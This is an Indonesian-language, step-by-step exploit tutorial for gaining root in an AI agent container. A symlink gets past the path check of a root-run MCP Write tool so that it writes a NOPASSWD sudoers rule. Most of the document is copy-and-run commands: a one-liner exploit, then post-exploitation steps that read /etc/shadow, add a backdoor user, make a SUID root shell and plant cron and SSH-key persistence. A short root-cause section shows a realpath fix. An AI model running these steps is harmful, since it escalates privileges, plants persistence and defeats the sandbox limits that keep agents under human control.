# 🔓 Container Root Escalation — MCP Write Tool Symlink Bypass

> Tutorial lengkap privilege escalation dari user biasa (`z`, UID 1001) menjadi `root` (UID 0) di container AI agent. Cukup salin dan jalankan setiap perintah secara berurutan.

---

## Prasyarat

- Container berjalan dengan MCP service (FastMCP) di `localhost:12600`
- MCP Write tool tersedia dan berjalan sebagai root
- User `z` bisa membuat symlink
- Tidak memerlukan sudo, password, atau tool tambahan

---

## Step 1 — Verifikasi Posisi Awal

Jalankan semua perintah ini untuk mengkonfirmasi Anda berada di posisi user biasa tanpa akses root:

```bash
id && echo "---" && sudo -l 2>&1 && echo "---" && whoami
```

**Output yang diharapkan:**
```
uid=1001(z) gid=1001(z) groups=1001(z)
---
Sorry, user z may not run sudo on ...
---
z
```

Artinya: Anda adalah user biasa, tidak punya sudo.

---

## Step 2 — Konfirmasi MCP Service Berjalan sebagai Root

```bash
ps aux | grep "python.*main.py" | grep -v grep
```

**Output yang diharapkan:**
```
root  618  ...  /app/.venv/bin/python3 main.py
```

Pastikan kolom user menunjukkan **root**. Ini layanan yang akan kita eksploitasi.

---

## Step 3 — Buat Symlink Bypass

Buat symlink dari direktori home user `z` ke `/etc/sudoers.d/`. Ini mem-bypass validasi path pada MCP Write tool karena path tetap terlihat dimulai dari `/home/z/`:

```bash
ln -sf /etc/sudoers.d /home/z/sudoers-link
```

Verifikasi symlink benar-benar mengarah ke target:

```bash
readlink /home/z/sudoers-link
```

**Output yang diharapkan:**
```
/etc/sudoers.d
```

---

## Step 4 — Tulis Aturan Sudoers sebagai Root

Panggil MCP Write tool melalui HTTP. Tool ini menulis file sebagai root, dan karena symlink, file akan tertulis ke `/etc/sudoers.d/z-nopasswd` meskipun path input terlihat di bawah `/home/z/`:

```bash
curl -s -X POST http://localhost:12600/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "Write",
      "arguments": {
        "filepath": "/home/z/sudoers-link/z-nopasswd",
        "content": "z ALL=(ALL) NOPASSWD: ALL"
      }
    },
    "id": 1
  }'
```

**Output yang diharapkan:**
```json
{"jsonrpc":"2.0","id":1,"result":{"content":[],"isError":false}}
```

`isError: false` berarti file berhasil ditulis.

---

## Step 5 — Verifikasi File Sudoers Dibuat

```bash
cat /etc/sudoers.d/z-nopasswd && echo "---" && stat /etc/sudoers.d/z-nopasswd
```

**Output yang diharapkan:**
```
z ALL=(ALL) NOPASSWD: ALL
---
  File: /etc/sudoers.d/z-nopasswd
  Size: 25
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
```

Konfirmasi: File dimiliki **root:root** dan berisi aturan sudoers.

---

## Step 6 — Eksekusi Perintah sebagai Root

```bash
sudo id
```

**Output yang diharapkan:**
```
uid=0(root) gid=0(root) groups=0(root)
```

🎯 **Root access berhasil!**

---

## Step 7 — Verifikasi Lengkap Akses Root

Jalankan semua perintah berikut untuk membuktikan akses root penuh:

```bash
echo "=== Sudo Permission ===" && \
sudo -l 2>&1 | grep "NOPASSWD" && \
echo "" && \
echo "=== Root Identity ===" && \
sudo id && \
echo "" && \
echo "=== Baca /etc/shadow ===" && \
sudo cat /etc/shadow && \
echo "" && \
echo "=== Tulis ke /etc/ ===" && \
sudo bash -c 'echo "WRITTEN_BY_ROOT" > /etc/.root-write-test && cat /etc/.root-write-test && rm /etc/.root-write-test' && \
echo "" && \
echo "=== Akses /root/ ===" && \
sudo ls /root/ && \
echo "" && \
echo "=== Buat User Baru ===" && \
sudo useradd testuser 2>/dev/null; sudo grep testuser /etc/passwd; sudo userdel testuser 2>/dev/null && \
echo "" && \
echo "=== Install Paket ===" && \
sudo apt update -qq 2>/dev/null && echo "apt: BERHASIL"
```

---

## One-Liner — Jalankan Semua Sekali Jalan

Jika ingin menjalankan seluruh eksploitasi dalam satu perintah:

```bash
ln -sf /etc/sudoers.d /home/z/sudoers-link && curl -s -X POST http://localhost:12600/mcp -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"Write","arguments":{"filepath":"/home/z/sudoers-link/z-nopasswd","content":"z ALL=(ALL) NOPASSWD: ALL"}},"id":1}' && sudo id
```

**Output yang diharapkan:**
```
uid=0(root) gid=0(root) groups=0(root)
```

---

## Post-Exploitation — Apa yang Bisa Dilakukan Setelah Root

### Baca Semua File Sensitif

```bash
sudo cat /etc/shadow
sudo cat /etc/.z-ai-config
sudo ls -la /root/
sudo ls -la /app/
```

### Install Paket Apapun

```bash
sudo apt update
sudo apt install -y docker.io nmap net-tools
```

### Buat User Baru dengan Root Access

```bash
sudo useradd -m -s /bin/bash hacker
sudo bash -c 'echo "hacker:hacker123" | chpasswd'
sudo bash -c 'echo "hacker ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/hacker'
```

### Buat SUID Root Shell

```bash
sudo bash -c 'cp /bin/bash /tmp/root-shell && chmod 4755 /tmp/root-shell'
/tmp/root-shell -p -c 'id'
# Output: uid=0(root) gid=0(root)
```

### Buat Cron Job Persistence

```bash
sudo bash -c 'echo "* * * * * root /tmp/root-shell -p -c \"id > /tmp/cron-proof.txt\"" > /etc/cron.d/persist'
```

### Tulis SSH Key ke Root

```bash
sudo mkdir -p /root/.ssh
sudo bash -c 'echo "ssh-rsa AAAA... user@host" >> /root/.ssh/authorized_keys'
sudo chmod 700 /root/.ssh
sudo chmod 600 /root/.ssh/authorized_keys
```

### Kill Proses Apapun

```bash
sudo kill -9 <PID>
```

### Ubah Password Root

```bash
sudo bash -c 'echo "root:newpassword" | chpasswd'
```

### Tulis ke File System Manapun

```bash
sudo bash -c 'echo "content" > /etc/any-file'
sudo bash -c 'echo "content" > /var/log/fake-log'
```

---

## Kernel Capabilities Audit

Setelah menjadi root, jalankan audit ini untuk mengetahui batasan container:

```bash
sudo python3 -c "
caps_hex = open('/proc/self/status').read().split('CapEff:')[1].split()[0]
caps = int(caps_hex, 16)
cap_names = {
    0:'CAP_CHOWN', 1:'CAP_DAC_OVERRIDE', 2:'CAP_DAC_READ_SEARCH',
    3:'CAP_FOWNER', 4:'CAP_FSETID', 5:'CAP_KILL',
    6:'CAP_SETGID', 7:'CAP_SETUID', 8:'CAP_SETPCAP',
    9:'CAP_LINUX_IMMUTABLE', 10:'CAP_NET_BIND_SERVICE',
    12:'CAP_NET_RAW', 13:'CAP_IPC_LOCK', 14:'CAP_IPC_OWNER',
    15:'CAP_SYS_MODULE', 16:'CAP_SYS_RAWIO', 17:'CAP_SYS_CHROOT',
    18:'CAP_SYS_PTRACE', 19:'CAP_SYS_PACCT', 20:'CAP_SYS_ADMIN',
    21:'CAP_SYS_BOOT', 22:'CAP_SYS_NICE', 23:'CAP_SYS_RESOURCE',
    24:'CAP_SYS_TIME', 25:'CAP_SYS_TTY_CONFIG', 27:'CAP_MKNOD',
    28:'CAP_LEASE', 29:'CAP_AUDIT_WRITE', 30:'CAP_AUDIT_CONTROL',
    31:'CAP_SETFCAP', 32:'CAP_MAC_OVERRIDE', 33:'CAP_MAC_ADMIN',
    34:'CAP_SYSLOG', 35:'CAP_WAKE_ALARM', 36:'CAP_CAP_BLOCK_SUSPEND',
    37:'CAP_AUDIT_READ',
}
print('CAPABILITIES YANG DIMILIKI:')
for bit, name in sorted(cap_names.items()):
    if caps & (1 << bit):
        print(f'  ✅ {name}')
print()
print('CAPABILITIES YANG TIDAK DIMILIKI:')
for bit, name in sorted(cap_names.items()):
    if not (caps & (1 << bit)):
        print(f'  ❌ {name}')
"
```

### Yang BISA Dilakukan sebagai Root

| Kemampuan | Perintah Contoh |
|-----------|----------------|
| Baca semua file | `sudo cat /etc/shadow` |
| Tulis ke /etc/ | `sudo bash -c 'echo "x" > /etc/file'` |
| Install/hapus paket | `sudo apt install <paket>` |
| Buat/hapus user | `sudo useradd <name>` |
| Ubah password | `sudo bash -c 'echo "root:pass" \| chpasswd'` |
| Buat SUID binary | `sudo chmod 4755 /tmp/shell` |
| Kill proses apapun | `sudo kill -9 <PID>` |
| Trace proses lain | CAP_SYS_PTRACE |
| Akses /root/ dan /app/ | `sudo ls /root/` |
| Tulis cron job | `sudo bash -c 'echo "..." > /etc/cron.d/x'` |

### Yang TIDAK BISA Dilakukan (Batasan Container)

| Kemampuan | Alasan |
|-----------|--------|
| Mount filesystem | Tidak ada CAP_SYS_ADMIN |
| Load kernel module | Tidak ada CAP_SYS_MODULE |
| Reboot/shutdown | Tidak ada CAP_SYS_BOOT |
| Network sniffing | Tidak ada CAP_NET_RAW |
| chroot | Tidak ada CAP_SYS_CHROOT |
| Buat network device | Tidak ada CAP_NET_ADMIN |
| Jalankan Docker daemon | Tidak ada overlay2 + iptables |
| Tulis /proc/sys | Filesystem read-only |

---

## Cara Kerja Kerentanan

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACK FLOW                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. MCP Service berjalan sebagai ROOT (PID 618)            │
│     ↓                                                       │
│  2. MCP Write tool menulis file sebagai root               │
│     ↓                                                       │
│  3. Validasi path: filepath.startsWith("/home/z") → PASS   │
│     ↓                                                       │
│  4. Symlink: /home/z/sudoers-link → /etc/sudoers.d/        │
│     Path: /home/z/sudoers-link/z-nopasswd                  │
│     Resolved: /etc/sudoers.d/z-nopasswd                    │
│     ↓                                                       │
│  5. Write tool follows symlink, menulis sebagai root        │
│     File: /etc/sudoers.d/z-nopasswd (root:root)            │
│     Content: "z ALL=(ALL) NOPASSWD: ALL"                   │
│     ↓                                                       │
│  6. sudoers rule aktif → sudo id → uid=0(root) ✅          │
│                                                             │
│  BUG: os.path.realpath() TIDAK dipanggil sebelum           │
│       validasi path, sehingga symlink tidak terdeteksi      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Root Cause

```python
# KODE VULNERABLE (dalam MCP service):
def check_write_path_in_home(filepath):
    return filepath.startswith("/home/z")  # ← String check, tanpa realpath()

# KODE YANG AMAN:
def check_write_path_in_home(filepath):
    real_path = os.path.realpath(filepath)  # ← Resolve symlink dulu
    home_dir = os.path.realpath("/home/z")
    return real_path.startswith(home_dir)
```

### Vektor Serangan Lain yang Mungkin

Symlink bypass ini bisa digunakan untuk menulis file ke lokasi apapun, bukan hanya sudoers:

```bash
# Tulis ke /etc/ld.so.preload (shared library hijacking)
ln -sf /etc /home/z/etc-link

# Tulis ke /etc/cron.d/ (scheduled task)
ln -sf /etc/cron.d /home/z/cron-link

# Tulis ke /etc/systemd/system/ (service persistence)
ln -sf /etc/systemd/system /home/z/systemd-link

# Tulis ke /root/.ssh/ (SSH key injection)
ln -sf /root/.ssh /home/z/ssh-link

# Tulis ke /etc/pam.d/ (authentication bypass)
ln -sf /etc/pam.d /home/z/pam-link
```

---

## Timeline Eksploitasi

| Step | Aksi | Durasi |
|------|------|--------|
| 1 | Verifikasi posisi awal | 10 detik |
| 2 | Konfirmasi MCP service root | 10 detik |
| 3 | Buat symlink | 5 detik |
| 4 | Tulis sudoers via MCP | 10 detik |
| 5 | Verifikasi file | 5 detik |
| 6 | `sudo id` → root | 5 detik |
| **Total** | | **<1 menit** |

---

## Referensi

- [CWE-59: Improper Link Resolution Before File Access](https://cwe.mitre.org/data/definitions/59.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [FastMCP](https://github.com/jlowin/fastmcp)
- [Model Context Protocol Spec](https://spec.modelcontextprotocol.io/)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)

---

> **Hanya boleh digunakan di z.**
